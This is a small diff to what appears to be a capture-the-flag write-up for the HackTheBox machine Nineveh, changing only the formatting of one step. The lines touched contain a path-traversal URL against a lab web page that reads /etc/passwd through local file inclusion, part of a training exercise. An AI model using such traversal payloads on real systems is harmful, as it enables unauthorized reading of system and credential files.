@@ -126,7 +126,7 @@ http://nineveh.htb/department/manage.php?notes=/ninevehNotes.txt../../../../../.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e727b1cf-9c79-4476-95a5-44f07e721400)
 
-+ Navigate to `http://nineveh.htb/department/manage.php?notes=/ninevehNotes.txt../../../../../../../etc/passwd` for /var/tmp/try.php`
++ Navigate to `http://nineveh.htb/department/manage.php?notes=/ninevehNotes.txt../../../../../../../etc/passwd` for **/var/tmp/try.php**
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/840b2abb-ea07-404a-8182-00ed1357adf5)
 
